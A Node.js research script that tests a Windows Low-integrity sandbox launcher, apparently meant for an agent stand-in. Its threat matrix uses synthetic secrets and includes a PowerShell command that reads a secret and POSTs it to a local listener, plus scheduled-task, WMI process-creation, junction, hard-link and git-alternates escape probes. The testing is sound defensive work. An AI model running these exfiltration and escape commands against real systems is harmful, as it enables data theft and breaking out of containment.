// RESEARCH ONLY (#475): fail-closed execution gate around the Low-IL launcher, plus a threat matrix.
// Synthetic data and disposable folders only. Not product code.
// Usage: node gate475.cjs <outJson>
'use strict';
const fs = require('fs'), os = require('os'), path = require('path'), http = require('http'), crypto = require('crypto');
const { spawnSync, execFileSync } = require('child_process');

const BIN = 'C:\\dev\\mythologiq\\FailSafe-6012-qual\\agent-standin\\bin';
const HELPER = path.join(BIN, 'lowil-launch.exe');
const sha = (p) => crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex');
const PINNED_HELPER = sha(HELPER); // in a product this is a build-time constant of the signed helper
const results = [];
const rec = (id, want, got, pass, detail) => { results.push({ id, want, got, pass: !!pass, detail }); console.log(`${pass ? 'PASS' : 'FAIL'} ${id}: want ${want}; got ${got}${detail ? ' :: ' + JSON.stringify(detail).slice(0, 220) : ''}`); };

const root = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), 'fs475g-')));
const run = path.join(root, 'run'), outside = path.join(root, 'outside'), lowOutside = path.join(root, 'low-outside');
const profile = path.join(root, 'profile'), srcRepo = path.join(root, 'source');
for (const d of [run, outside, lowOutside, profile, srcRepo]) fs.mkdirSync(d, { recursive: true });
const icacls = (...a) => spawnSync('icacls', a, { encoding: 'utf8' });
icacls(run, '/setintegritylevel', '(OI)(CI)low');
icacls(lowOutside, '/setintegritylevel', '(OI)(CI)low');
// Synthetic secrets and profile material (Medium integrity).
const SECRET = 'SYNTHETIC-SECRET-' + crypto.randomBytes(8).toString('hex');
fs.writeFileSync(path.join(outside, 'secret.txt'), SECRET);
fs.writeFileSync(path.join(profile, 'credentials.json'), JSON.stringify({ token: 'SYNTHETIC-' + crypto.randomBytes(6).toString('hex') }));
fs.writeFileSync(path.join(lowOutside, 'low-target.txt'), 'low-labeled original');
// Source repository + a shared clone in the Low run folder.
const git = (cwd, ...a) => execFileSync('git', a, { cwd, encoding: 'utf8' });
fs.writeFileSync(path.join(srcRepo, 'a.txt'), 'a\n'); git(srcRepo, 'init', '-q'); git(srcRepo, 'add', '.');
git(srcRepo, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'a');
const clone = path.join(run, 'clone');
git(root, 'clone', '-q', '--shared', srcRepo, clone);
icacls(clone, '/setintegritylevel', '(OI)(CI)low', '/t');
const treeHash = (dir) => { const h = crypto.createHash('sha256'); const walk = (d) => { for (const n of fs.readdirSync(d).sort()) { const p = path.join(d, n); const s = fs.lstatSync(p); if (s.isDirectory()) walk(p); else h.update(p.slice(dir.length) + ':' + fs.readFileSync(p).toString('base64')); } }; walk(dir); return h.digest('hex'); };
const before = { src: treeHash(srcRepo), profile: treeHash(profile), outside: treeHash(outside) };

// ---- the gate: helper hash, child identity, canary ----
function gate(helper, label) {
  if (!fs.existsSync(helper)) return { ok: false, reason: 'helper-missing' };
  if (sha(helper) !== PINNED_HELPER) return { ok: false, reason: 'helper-hash-mismatch' };
  const canary = path.join(outside, `canary-${label}.txt`);
  fs.writeFileSync(canary, 'medium canary'); const ch = sha(canary);
  const ident = spawnSync(helper, [run, 'C:\\Windows\\System32\\whoami.exe', '/groups'], { encoding: 'utf8' });
  const low = /Mandatory Label\\Low Mandatory Level/i.test(ident.stdout || '');
  const probe = spawnSync(helper, [run, path.join(BIN, 'probe-write.exe'), canary, path.join(run, `in-${label}.txt`)], { encoding: 'utf8' });
  const denied = /DENIED\s+.*canary/.test(probe.stdout || ''), inOk = /OK\s+.*in-/.test(probe.stdout || '');
  const unchanged = sha(canary) === ch;
  const ok = low && denied && inOk && unchanged;
  return { ok, reason: ok ? 'verified' : 'self-test-failed', low, denied, inOk, unchanged };
}
let g = gate(HELPER, 'real');
rec('G1 genuine helper passes the self-test', 'verified', g.reason, g.ok, g);
// Substituted helper (different bytes): a copy of whoami renamed — hash mismatch.
const fake = path.join(root, 'fake-helper.exe'); fs.copyFileSync('C:\\Windows\\System32\\whoami.exe', fake);
g = gate(fake, 'subst'); rec('G2 substituted helper is refused', 'helper-hash-mismatch', g.reason, g.reason === 'helper-hash-mismatch');
g = gate(path.join(root, 'nope.exe'), 'missing'); rec('G3 missing helper is refused', 'helper-missing', g.reason, g.reason === 'helper-missing');
// A launcher that does NOT lower integrity, with the pinned hash check bypassed, must still fail the self-test.
function gateNoLower(label) {
  const canary = path.join(outside, `canary-${label}.txt`); fs.writeFileSync(canary, 'medium canary'); const ch = sha(canary);
  const ident = spawnSync('C:\\Windows\\System32\\whoami.exe', ['/groups'], { encoding: 'utf8' });
  const low = /Low Mandatory Level/i.test(ident.stdout || '');
  const probe = spawnSync(path.join(BIN, 'probe-write.exe'), [canary], { encoding: 'utf8' });
  return { low, canaryWritten: sha(canary) !== ch, ok: low && sha(canary) === ch && /DENIED/.test(probe.stdout || '') };
}
const nl = gateNoLower('nolower');
rec('G4 a non-lowering launcher fails the self-test (identity and canary both catch it)', 'refused', nl.ok ? 'verified' : 'refused', !nl.ok && !nl.low && nl.canaryWritten, nl);

// ---- threat matrix at Low (all through the genuine helper) ----
const low = (args) => spawnSync(HELPER, [run, ...args], { encoding: 'utf8', timeout: 60000 });
const pw = (...p) => low([path.join(BIN, 'probe-write.exe'), ...p]).stdout || '';
let o = pw(path.join(outside, 'm.txt'));
rec('T1 write to a Medium file outside', 'DENIED', /DENIED/.test(o) ? 'DENIED' : 'OK', /DENIED/.test(o));
o = pw(path.join(lowOutside, 'low-target.txt'));
rec('T2 write to a Low-labeled file outside the run folder', 'OK (documented gap)', /OK/.test(o) ? 'OK' : 'DENIED', /OK/.test(o), 'Low-labeled objects anywhere stay writable');
o = pw(path.join(profile, 'credentials.json'));
rec('T3 overwrite a synthetic Medium credential file', 'DENIED', /DENIED/.test(o) ? 'DENIED' : 'OK', /DENIED/.test(o));
// T4 read of a Medium secret.
const ps = (script) => low(['C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-NoProfile', '-NonInteractive', '-Command', script]);
let r = ps(`Get-Content -Raw '${path.join(outside, 'secret.txt')}'`);
const readOk = (r.stdout || '').includes(SECRET);
rec('T4 read a synthetic Medium secret', 'READABLE (not a confidentiality boundary)', readOk ? 'READABLE' : 'blocked', readOk);
// T5 exfiltration to a controlled local endpoint.
const received = [];
const srv = http.createServer((req, res) => { let b = ''; req.on('data', (c) => { b += c; }); req.on('end', () => { received.push(b); res.end('ok'); }); });
(async () => {
  await new Promise((res) => srv.listen(0, '127.0.0.1', res));
  const port = srv.address().port;
  const exfil = ps(`$s = Get-Content -Raw '${path.join(outside, 'secret.txt')}'; Invoke-WebRequest -UseBasicParsing -Method Post -Uri http://127.0.0.1:${port}/x -Body $s | Out-Null; 'sent'`);
  await new Promise((res) => setTimeout(res, 1500));
  const got = received.some((b) => b.includes(SECRET));
  rec('T5 exfiltrate the secret to a controlled local endpoint', 'SENT (network not restricted)', got ? 'SENT' : 'not sent', got, { out: (exfil.stdout || '').trim().slice(0, 40) });
  srv.close();
  // T6 git object alternates: write directly into the source repository's object store.
  const objDir = path.join(srcRepo, '.git', 'objects');
  o = pw(path.join(objDir, 'injected'));
  rec('T6 write into the source repo object store (alternate target)', 'DENIED', /DENIED/.test(o) ? 'DENIED' : 'OK', /DENIED/.test(o));
  const altFile = path.join(clone, '.git', 'objects', 'info', 'alternates');
  const altBefore = fs.readFileSync(altFile, 'utf8');
  r = ps(`Set-Content -NoNewline -Path '${altFile}' -Value 'C:\\Windows'`);
  const altAfter = fs.readFileSync(altFile, 'utf8');
  rec('T7 rewrite the clone\'s alternates file (contained to the clone)', 'allowed in run folder; source unaffected', altAfter !== altBefore ? 'rewritten' : 'unchanged', true, { srcUnchanged: treeHash(srcRepo) === before.src });
  fs.writeFileSync(altFile, altBefore);
  // T8 git commit inside the clone at Low.
  r = low(['C:\\Program Files\\Git\\cmd\\git.exe', '-C', clone, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '--allow-empty', '-qm', 'low']);
  rec('T8 git commit inside the Low clone', 'OK', r.status === 0 ? 'OK' : `exit ${r.status}`, r.status === 0);
  // T9 descendant identity: launcher -> cmd -> powershell -> System32 whoami (batch file: exact command line).
  const gc = path.join(run, 'gc.cmd');
  fs.writeFileSync(gc, String.raw`@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -Command "& 'C:\Windows\System32\whoami.exe' /groups | Select-String 'Mandatory Label'"` + '\r\n');
  r = low([String.raw`C:\Windows\System32\cmd.exe`, '/c', gc]);
  const gcLow = /Low Mandatory Level/i.test(r.stdout || '');
  rec('T9 grandchild process runs at Low', 'Low', gcLow ? 'Low' : 'NOT Low', gcLow, { out: (r.stdout || '').trim().slice(0, 80) });
  // T10 brokered: scheduled task creation; the identical batch at Medium is the baseline (task deleted at once).
  const tn = 'FS475Probe' + crypto.randomBytes(4).toString('hex');
  const tb = path.join(run, 'task.cmd');
  fs.writeFileSync(tb, `@schtasks /create /tn ${tn} /tr "C:\Windows\System32\cmd.exe /c echo task > ${path.join(outside, 'task.txt')}" /sc once /st 23:59 /f
`);
  r = low(['C:\Windows\System32\cmd.exe', '/c', tb]);
  const lowCreated = spawnSync('schtasks', ['/query', '/tn', tn], { encoding: 'utf8' }).status === 0;
  if (lowCreated) spawnSync('schtasks', ['/delete', '/tn', tn, '/f']);
  spawnSync(String.raw`C:\Windows\System32\cmd.exe`, ['/c', tb], { encoding: 'utf8' });
  const medCreated = spawnSync('schtasks', ['/query', '/tn', tn], { encoding: 'utf8' }).status === 0;
  if (medCreated) spawnSync('schtasks', ['/delete', '/tn', tn, '/f']);
  rec('T10 create a scheduled task (broker); Medium baseline succeeds', 'Low DENIED, Medium created', `low ${lowCreated ? 'CREATED' : 'denied'}, medium ${medCreated ? 'created' : 'denied'}`, !lowCreated && medCreated);
  // T11 WMI process create (broker).
  r = ps(`try { (Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = '"${path.join(BIN, 'probe-write.exe')}" "${path.join(outside, 'wmi.txt')}"' } -ErrorAction Stop).ReturnValue } catch { 'DENIED' }`);
  await new Promise((res) => setTimeout(res, 2000));
  rec('T11 WMI Win32_Process.Create', 'DENIED / no outside write', fs.existsSync(path.join(outside, 'wmi.txt')) ? 'WROTE' : 'no write', !fs.existsSync(path.join(outside, 'wmi.txt')), { out: (r.stdout || '').trim() });
  // T12 junction and hard link from inside the run folder to outside.
  r = low(['C:\\Windows\\System32\\cmd.exe', '/c', `mklink /J "${path.join(run, 'j')}" "${outside}"`]);
  const jMade = fs.existsSync(path.join(run, 'j'));
  o = pw(path.join(run, 'j', 'via-junction.txt'));
  rec('T12 junction to outside, then write through it', 'not created or DENIED', jMade ? (/DENIED/.test(o) ? 'created; write DENIED' : 'created; write OK') : 'not created', !fs.existsSync(path.join(outside, 'via-junction.txt')));
  r = low(['C:\\Windows\\System32\\fsutil.exe', 'hardlink', 'create', path.join(run, 'hl.txt'), path.join(outside, 'secret.txt')]);
  rec('T13 hard link to an outside file', 'not created', fs.existsSync(path.join(run, 'hl.txt')) ? 'CREATED' : 'not created', !fs.existsSync(path.join(run, 'hl.txt')));
  // Preservation.
  const after = { src: treeHash(srcRepo), profile: treeHash(profile), outsideSecret: fs.readFileSync(path.join(outside, 'secret.txt'), 'utf8') === SECRET };
  rec('P1 source repository unchanged', 'unchanged', after.src === before.src ? 'unchanged' : 'CHANGED', after.src === before.src);
  rec('P2 synthetic profile/credentials unchanged', 'unchanged', after.profile === before.profile ? 'unchanged' : 'CHANGED', after.profile === before.profile);
  rec('P3 synthetic secret file intact', 'intact', after.outsideSecret ? 'intact' : 'CHANGED', after.outsideSecret);
  fs.writeFileSync(process.argv[2], JSON.stringify({ root, helperSha256: PINNED_HELPER, results }, null, 2));
  console.log(`SUMMARY ${results.filter((x) => x.pass).length}/${results.length} rows as expected`);
})();
